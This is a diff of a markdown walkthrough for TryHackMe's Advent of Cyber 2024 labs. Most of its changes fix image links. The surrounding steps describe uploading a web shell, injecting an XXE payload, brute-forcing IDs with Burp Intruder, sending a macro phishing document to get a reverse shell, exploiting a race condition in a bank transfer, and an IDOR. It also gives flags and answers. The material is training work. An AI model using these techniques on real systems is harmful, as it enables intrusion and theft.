@@ -41,13 +41,13 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    We can download any youtube video using its link on the website linked on the system. Either select mp3 or mp4.
 
-   ![Link]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Link.png}
+   ![Link](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Link.png)
 
-   ![Download]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Download.png}
+   ![Download](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Download.png)
 
    Using `file` we can check out the files. We can see the second file `somg.mp3` is not what we would expect.
 
-   ![Files]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Files.png}
+   ![Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Files.png)
 
    Using Exiftool we can find out the author of the song.
 
@@ -55,7 +55,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    exiftool song.mp3
    ```
 
-   ![Artist]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Artist.png}
+   ![Artist](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Artist.png)
 
    ><details><summary>Click for answer</summary>Tyler Ramsbey</details>
 
@@ -63,11 +63,11 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Using exiftool on the other file we see there is a link to a powershell file on a Github page.
 
-   ![Github Link]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Link.png}
+   ![Github Link](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Link.png)
 
    Navigating to this link we see the malicious script. At the bottom we can find the address of the c2 server.
 
-   ![Script]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Script.png}
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Script.png)
 
    ><details><summary>Click for answer</summary>http://papash3ll.thm/data</details>
 
@@ -75,9 +75,9 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    To find out more about M.M. we can go to the Github profile we can derive from the powershell script url. On this page we can open the M.M. repo.
 
-   ![Github Repo]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Repo.png}
+   ![Github Repo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Repo.png)
 
-   ![Github Profile]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Profile.png}
+   ![Github Profile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Profile.png)
 
    Seems we have a name here!
 
@@ -89,7 +89,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    ISSUES
 
-   ![Github Commits]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Commits.png}
+   ![Github Commits](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_1_Github_Commits.png)
 
    ><details><summary>Click for answer</summary>6791</details>
 
@@ -103,7 +103,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Filtering on the date from November 29th 0.00 to December 1st 9.30, we see one username responsible for many failed login attempts.
 
-   ![Failed Attempts]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Failed_Attempts.png}
+   ![Failed Attempts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Failed_Attempts.png)
 
    ><details><summary>Click for answer</summary>service_admin</details>
 
@@ -111,7 +111,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    To view how many failed attempts have been made, we should filter on `event.outcome` and `event.category`.
 
-   ![Number]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Number.png}
+   ![Number](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Number.png)
 
    ><details><summary>Click for answer</summary>6791</details>
 
@@ -119,7 +119,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Filtering of the user name and `event.category` = "authentication", and filtering the previously found IP we get the ip of the Glitch.
 
-   ![Ip]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Ip.png}
+   ![Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Ip.png)
 
    ><details><summary>Click for answer</summary>10.0.255.1</details>
 
@@ -127,7 +127,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Now we can also filter furthe on hostname `ADM-01` and output `success`, the see when the successfull attempt by this IP address was made.
 
-   ![Success]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Success.png}
+   ![Success](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Success.png)
 
    ><details><summary>Click for answer</summary>Dec 1, 2024 08:54:39.000</details>
 
@@ -135,11 +135,11 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    We can filter out any entries with a blank command value.
 
-   ![Command]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Command.png}
+   ![Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Command.png)
 
    Here we see the powershell command with a base64 encoded payload. We can decode this using Cyberchef. Make sure to also decode the text using `UTF-16LE (1200)` encoding.
 
-   ![Decoded]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Decoded.png}
+   ![Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_2_Decoded.png)
 
    ><details><summary>Click for answer</summary>Install-WindowsUpdate -AcceptAll -AutoReboot</details>
 
@@ -153,7 +153,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Now we can search for "shell.php" in the message.
 
-   ![Message]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Message.png}
+   ![Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Message.png)
 
    ><details><summary>Click for answer</summary>/media/images/rooms/shell.php</details>
 
@@ -161,7 +161,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    In the results we can see multiple IPs. One of which is malicious.
 
-   ![Rce]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Rce.png}
+   ![Rce](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Rce.png)
 
    That is the on where we can see a file upload abuse is used.
 
@@ -173,27 +173,27 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    ><details><summary>Click for hint</summary>admin@frostypines.thm : admin</details>
 
-   ![Login]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Login.png}
+   ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Login.png)
 
    On the admin dashboard, we see a feature to add a new room. Perhaps this lets us upload an image (our shell).
 
-   ![New Room]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_New_Room.png}
+   ![New Room](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_New_Room.png)
 
    We can indeed upload an image here. Lets create our payload and try to upload it here. It may filter the extension, so we will see.
 
-   ![Shell]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Shell.png}
+   ![Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Shell.png)
 
-   ![Upload]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Upload.png}
+   ![Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Upload.png)
 
-   ![Uploaded]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Uploaded.png}
+   ![Uploaded](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Uploaded.png)
 
    Seems we were successfull! Let's try our shell.
 
-   ![Web Shell]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Web_Shell.png}
+   ![Web Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Web_Shell.png)
 
    Success! Now we can look for the flag and read its contents.
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_3_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{Gl1tch_Was_H3r3}</details>
 
@@ -205,7 +205,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Let's first clear the operational log for sysmon at `Applications and Services => Microsoft => Windows => Sysmon => Operational`.
    
-   ![Clear]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Clear.png}
+   ![Clear](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Clear.png)
 
    Now we can run the phishing test using:
 
@@ -213,15 +213,15 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Invoke-AtomicTest -AtomicTechnique T1566.001 -TestNumbers 1
    ```
 
-   ![Phishing]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Phishing.png}
+   ![Phishing](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Phishing.png)
 
    Refreshing the event viewer, we can see new events created by the test. One of these is related to the creation of the xlsm file. 
    
-   ![Target]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Target.png}
+   ![Target](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Target.png)
 
    We can navigate to this path to find the .txt file.
 
-   ![Flag 1]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Flag_1.png}
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Flag_1.png)
 
    ><details><summary>Click for answer</summary>THM{GlitchTestingForSpearphishing}</details>
 
@@ -229,7 +229,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    On the MITRE Attack Framework webpage, we can search for any techniques involving "Command and Scripting Interpreter".
 
-   ![Mitre]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Mitre.png}
+   ![Mitre](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Mitre.png)
 
    ><details><summary>Click for answer</summary>T1059</details>
 
@@ -247,7 +247,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Invoke-AtomicTest -AtomicTechnique T1059.003 -ShowDetailsBrief
    ```
 
-   ![Brief]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Brief.png}
+   ![Brief](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Brief.png)
 
    Since we are looking to conduct a test related to ransomware, our test of interest will be number 4.
 
@@ -261,7 +261,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    Invoke-AtomicTest -AtomicTechnique T1059.003 -TestNumbers 4 -ShowDetails
    ```
 
-   ![Details]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Details.png}
+   ![Details](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Details.png)
 
    Looking at the commands being executed we can find which file is used in this test.
 
@@ -271,11 +271,11 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    We can either read the file we found earlier using `type C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.txt` or we can run the test to see the results.
 
-   ![Test Output]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Test_Output.png}
+   ![Test Output](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Test_Output.png)
 
    We can save the resulting PDF and open it to find our flag.
 
-   ![Flag 2]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Flag_2.png}
+   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_4_Flag_2.png)
 
    ><details><summary>Click for answer</summary>THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}</details>
 
@@ -287,15 +287,15 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Lets begin by setting up the proxy in our browser for Burpsuite to intercept the requests. If we navigate the platform, we can see requests are being intercepted.
 
-   ![Proxy]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Proxy.png}
+   ![Proxy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Proxy.png)
 
    To modify the request, we should first make a request to add a product to our wishlist. This is then visible in the history list.
 
-   ![Wishlist]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Wishlist.png}
+   ![Wishlist](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Wishlist.png)
 
    Now we can send this request to Repeater so we can start exploiting the vulnerability.
 
-   ![Repeater]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Repeater.png}
+   ![Repeater](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Repeater.png)
 
    To use the vulnerability, we must add the following to the request.
 
@@ -306,9 +306,9 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Remember to also add the payload within the product element, `&payload;`.
 
-   ![Payloads]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Payloads.png}
+   ![Payloads](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Payloads.png)
 
-   ![Request 1]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Request_1.png}
+   ![Request 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Request_1.png)
 
    As you can see we get the contents of wishlist number one.
    
@@ -316,13 +316,13 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Lets send the request to Intruder and add a payload marker.
 
-   ![Intruder]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Intruder.png}
+   ![Intruder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Intruder.png)
 
    In the payloads section, we should add a number list with a start to finish of 1 and 21, with an increment of 1.
 
    Now we can start the attack and it will make all the requests for us. Looking through each one untill we find our flag.
 
-   ![Flag 1]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Flag_1.png}
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Flag_1.png)
 
    ><details><summary>Click for answer</summary>THM{Brut3f0rc1n6_mY_w4y}</details>
 
@@ -332,7 +332,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    http://10.10.148.95/CHANGELOG
 
-   ![Flag 2]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Flag_2.png}
+   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_5_Flag_2.png)
 
    ><details><summary>Click for answer</summary>THM{m4y0r_m4lw4r3_b4ckd00rs}</details>
 
@@ -384,7 +384,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"],(.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A", .requestParameters.bucketName // "N/A",.requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t
    ```
 
-   ![Activity]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Activity.png}
+   ![Activity](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Activity.png)
 
    There is one other activity from user glitch.
 
@@ -406,7 +406,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Event_Source", "Key", "Source_IP"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventName, .userIdentity.userName // "N/A", .requestParameters.bucketName // "N/A", .eventSource, .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t
    ```
 
-   ![Service]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Service.png}
+   ![Service](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Service.png)
 
    ><details><summary>Click for answer</summary>signin.amazonaws.com</details>
 
@@ -424,7 +424,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '.Records[] | select(.eventSource == "iam.amazonaws.com" and .eventName == "CreateUser")' cloudtrail_log.json
    ```
 
-   ![User]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_User.png}
+   ![User](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_User.png)
 
    It seems it was mcskidy who created the account.
 
@@ -438,7 +438,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '.Records[] | select(.eventSource == "iam.amazonaws.com" and .eventName == "AttachUserPolicy")' cloudtrail_log.json 
    ```
 
-   ![Policy]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Policy.png}
+   ![Policy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Policy.png)
 
    ><details><summary>Click for answer</summary>AdministratorAccess</details>
 
@@ -450,7 +450,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '["Event_Time", "Event_Name", "User_Name", "Event_Source", "Source_IP"],(.Records[] | select(.userIdentity.userName == "mayor_malware") | [.eventTime, .eventName, .userIdentity.userName // "N/A", .eventSource, .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t
    ```
 
-   ![Ip]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Ip.png}
+   ![Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Ip.png)
 
    ><details><summary>Click for answer</summary>53.94.201.69</details>
 
@@ -462,7 +462,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    jq -r '["Event_Time", "Event_Name", "User_Name", "Event_Source", "Source_IP"],(.Records[] | select(.userIdentity.userName == "mcskidy") | [.eventTime, .eventName, .userIdentity.userName // "N/A", .eventSource, .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t
    ```
 
-   ![Mcskidy]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Mcskidy.png}
+   ![Mcskidy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Mcskidy.png)
 
    ><details><summary>Click for answer</summary>31.210.15.79</details>
 
@@ -474,7 +474,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    grep INSERT | grep Mayor rds.log
    ```
 
-   ![Bank]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Bank.png}
+   ![Bank](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_7_Bank.png)
 
    ><details><summary>Click for answer</summary>2394 6912 7723 1294</details>
 
@@ -515,7 +515,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Notice that it automatically switching to the correct payload.
 
-   ![Create Document]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Create_Document.png}
+   ![Create Document](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Create_Document.png)
 
    Now we can send this document via email, but first we should setup a listener on the correct port. Notice that the payload needs to be set.
 
@@ -529,15 +529,15 @@ This guide contains the answer and steps necessary to get to them for the [Adven
    run
    ```
 
-   ![Listener]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Listener.png}
+   ![Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Listener.png)
 
    Now we can login to the mail server to send our phishing mail.
 
-   ![Login]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Login.png}
+   ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Login.png)
 
    Here we must create a convincing email with the macro enabled file.
 
-   ![Email]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Email.png}
+   ![Email](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Email.png)
 
    ```cmd
    Important Invoice of our Client!
@@ -556,11 +556,11 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    Looks like she responded:
 
-   ![Response]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Response.png}
+   ![Response](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Response.png)
 
    After two minutes we get a reverse shell back. Lets find the flag!
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{PHISHING_CHRISTMAS}</details>
 
@@ -646,27 +646,27 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    After login into the dashboard, we can see the requests in the history list.
 
-   ![Login]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Login.png}
+   ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Login.png)
 
    We can see that manually trying to transfer $2000,- doesn't work as it detect that we have insufficient funds. However, we can use race conditions with Burpsuite.
 
-   ![Insufficient]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Insufficient.png}
+   ![Insufficient](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Insufficient.png)
 
    In Burpsuite, we can use the previously created transfer request and modify it after sending it to Repeater.
 
-   ![Repeater]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Repeater.png}
+   ![Repeater](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Repeater.png)
 
    Duplicate these windows a couple of times using Crtl + R and group them together.
 
-   ![Group]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Group.png}
+   ![Group](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Group.png)
 
    Now we can run all requests in parallel. In our browser session we can see more than our balance has been transferred.
 
-   ![Send]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Send.png}
+   ![Send](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Send.png)
 
    However, I did this with the tester account and should have done it with the glitch account. But the steps remain the same. Hold on while I do this again with the correct account.
 
-   ![Flag]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Flag.png}
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_12_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{WON_THE_RACE_007}</details>
 
@@ -680,21 +680,21 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 
    We can see the tracking is currently tracking Glitch's car. Make sure to proxy the browser to Burpsuite.
 
-   ![Glitch Car]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Glitch_Car.png}
+   ![Glitch Car](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Glitch_Car.png)
 
    Now make sure to untrack the car and turn off intercept. Now turn of intecept and click the track button.
 
-   ![Intercept]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Intercept.png}
+   ![Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Intercept.png)
 
    We can see the request made to track a certain car. 
    
-   ![Avatar Glitch]{https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Avatar_Glitch.png}
+   ![Avatar Glitch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2024/Advent_of_Cyber_2024_Day_13_Avatar_Glitch.png)
    
    If we change the user id to something else, we could track someone else's car. Changing this to '8', we can track Mayor Malwares car. From the message list on the right we can open the avatar for Mayor Malware in a new tab and see that his userid is in fact '8'.
 
    Forward the request and turn off intercept to start tracking. A flag will appear.
 
